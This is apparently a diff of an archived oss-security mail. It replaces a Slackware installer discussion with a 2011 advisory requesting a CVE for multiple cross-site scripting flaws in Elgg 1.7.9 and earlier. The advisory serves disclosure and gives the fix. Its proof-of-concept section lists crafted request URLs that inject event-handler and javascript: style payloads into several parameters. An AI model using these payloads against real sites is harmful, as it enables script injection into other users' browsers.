@@ -1,55 +1,136 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/11/29/7
-Message-ID: <4ED4E78C.8070907@slackware.com>
-Date: Tue, 29 Nov 2011 08:09:16 -0600
-From: "Patrick J. Volkerding" <security@...ckware.com>
-To: Raphael Bastos <tecnologia@...tosservice.com.br>
-CC: oss-security@...ts.openwall.com
-Subject: Re: Fwd: Bug script install slackware
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/07/30/1
+Message-ID: <CAPYM6VykOq64TVvbYddPjcd5saEPu9Hs-OwnjBr8=ESZaHTkVg@mail.gmail.com>
+Date: Sat, 30 Jul 2011 22:44:41 +0800
+From: YGN Ethical Hacker Group <lists@...g.net>
+To: oss-security@...ts.openwall.com
+Subject: CVE Request: Elgg 1.7.9 <= | Multiple Cross Site Scripting Vulnerabilities
 Content-Type: text/plain; charset=utf-8
 
-Hello,
+Elgg 1.7.9 <= | Multiple Cross Site Scripting Vulnerabilities
 
-While I'm sure there are a number of bugs in the crufty old installer 
-scripts, I'll need to know how there's a security impact before 
-notifying everyone that the sky has fallen.  I'd also like to note that 
-if running the installer requires physical access to the machine I'm 
-liable to consider security to already be non-existent at that time.
 
-Please clarify what is wrong with examples of how to reproduce the 
-issue, and I'll look into it.
 
-Thanks.
+1. OVERVIEW
 
-On 11/28/2011 05:18 PM, Raphael Bastos wrote:
-> ---------- Forwarded message ----------
-> From: Raphael Bastos<tecnologia@...tosservice.com.br>
-> Date: 2011/10/28
-> Subject: Bug script install slackware
-> To: volkerdi@...ckware.com
->
->
-> Take a look.... this is the correction sugest to script "SeTpartitions".
->
-> EX: sed ,'/mnt','$T_PX',g --- on lines 374, 495, 496, 503.
->
-> livecd setup # cat -n  SeTpartitions |grep T_PX
->    10  T_PX=/mnt
->   374  mount $ROOT_DEVICE $T_PX -t $ROOT_SYS_TYPE 1>  $REDIR 2>  $REDIR
->   495        if [ ! -d $T_PX/$MTPT ]; then
->   496           mkdir -p $T_PX/$MTPT
->   503        mount $NEXT_PARTITION $T_PX/$MTPT -t $NEXT_SYS_TYPE 1>
-> $REDIR 2>  $REDIR
->
->
-> Att,
-> Raphael Bastos aka chemonz
->
-> ===============================================
-> Bastos Service Manutenção Industrial Ltda.
-> www.bastosservice.com.br
-> Linux Reg. User: 388431  //  LPI ID: LPI000214711
-> email:~>  $ echo "vgepqnqikcBdcuvquugtxkeg0eqo0dt" | perl -pe \
-> 's/(.)/chr(ord($1)-2)/ge'
-> ===============================================
+The Elgg 1.7.9 and lower versions are vulnerable to multiple Cross
+Site Scripting.
 
+
+2. BACKGROUND
+
+Elgg is an award-winning social networking engine, delivering the
+building blocks that enable businesses, schools, universities and
+associations to create their own fully-featured social networks and
+applications. Well-known Organizations with networks powered by Elgg
+include: Australian Government, British Government, Federal Canadian
+Government, MITRE, The World Bank, UNESCO, NASA, Stanford University,
+Johns Hopkins University and more (http://elgg.org/powering.php)
+
+
+3. VULNERABILITY DESCRIPTION
+
+Several parameters (page_owner, content,internalname, QUERY_STRING)
+are not properly sanitized, which allows attacker to conduct Cross
+Site Scripting attack. This may allow an attacker to create a
+specially crafted URL that would execute arbitrary script code in a
+victim's browser.
+
+
+4. VERSIONS AFFECTED
+
+Elgg 1.7.9 <=
+
+
+5. PROOF-OF-CONCEPT/EXPLOIT
+
+
+XSS (Browser All)
+
+N.B. User login is required to execute.
+
+vulnerable parameters: page_owner, content,internalname, QUERY_STRING
+______________________________________________________________________________________________
+
+REQUEST:
+
+http://localhost/elgg/mod/file/search.php?subtype=file&page_owner=%22%20style%3d%22position:fixed;width:1000px;height:1000px;display:block;left:0;top:0%22%20onmouseover%3d%22alert%28/XSS/%29%22%20x=%22f
+
+http://localhost/elgg/mod/riverdashboard/?content=%22%20style%3d%22position:fixed;width:1000px;height:1000px;display:block;left:0;top:0%22%20onmouseover%3d%22alert%28/XSS/%29%22%20x=%22f&callback=true
+
+http://localhost/elgg/pg/embed/upload?internalname=%22%20onmouseover%3d%22alert%28%27XSS%27%29%22%20style%3d%22position:fixed;width:1000px;height:1000px;display:block;left:0;top:0%22
+
+http://localhost/elgg/pg/pages/edit/%22%20onmouseover%3d%22alert%28%27XSS%27%29%22%20style%3d%22position:fixed;width:1000px;height:1000px;display:block;left:0;top:0%22
+
+
+XSS (Exploitable in Older versions of Browsers - IE/FF)
+vulnerable parameters: send_to,container_guid
+=========================================================
+
+REQUEST:
+
+http://localhost/elgg/pg/messages/compose/?send_to=%22%20style%3d%22background-image%3aurl%28javascript:alert%28/XSS/%29%29%22%20x=%22s
+
+
+Portion of RESPONSE:
+
+<input type="hidden" name="send_to" value=""
+style="background-image:url(javascript:alert(/XSS/))" x="s" />
+
+
+REQUEST:
+
+http://localhost/elgg/pg/pages/new/?container_guid=%22%20style%3d%22background-image%3aurl%28javascript:alert%28/XSS/%29%29%22%20x=%22
+
+
+Portion of RESPONSE:
+
+<input type="hidden" name="container_guid" value=""
+style="background-image:url(javascript:alert(/XSS/))" x="s" />
+
+
+
+6. SOLUTION
+
+Upgrade to 1.7.10 or higher.
+
+
+7. VENDOR
+
+Curverider Ltd
+http://www.curverider.co.uk/
+http://elgg.org/
+
+
+8. CREDIT
+
+This vulnerability was discovered by Aung Khant, http://yehg.net, YGN
+Ethical Hacker Group, Myanmar.
+
+
+9. DISCLOSURE TIME-LINE
+
+2011-06-09: vulnerability reported
+2011-06-14: vendor released fixed version
+2011-07-30: vulnerability disclosed
+
+
+10. REFERENCES
+
+Original Advisory URL:
+http://yehg.net/lab/pr0js/advisories/[elgg_179]_cross_site_scripting
+Project Home: http://elgg.org/
+XSS (owasp): http://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
+CWE-79: http://cwe.mitre.org/data/definitions/79.html
+
+
+#yehg [2011-07-30]
+
+
+---------------------------------
+Best regards,
+YGN Ethical Hacker Group
+Yangon, Myanmar
+http://yehg.net
+Our Lab | http://yehg.net/lab
+Our Directory | http://yehg.net/hwd
